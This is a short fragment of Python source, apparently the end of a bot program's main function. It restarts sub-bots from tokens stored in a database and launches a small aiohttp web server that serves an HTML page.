    cursor.execute("SELECT token FROM subbots")
    for row in cursor.fetchall(): await start_new_subbot(row[0])
    
    webapp = web.Application()
    webapp.router.add_get('/', serve_html)
    
    runner = web.AppRunner(webapp)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', WEB_SERVER_PORT)
    await site.start()
    print(f"â… System Online! Web Server running on Port {WEB_SERVER_PORT}")
    await idle()

if __name__ == "__main__":
    app.run(main())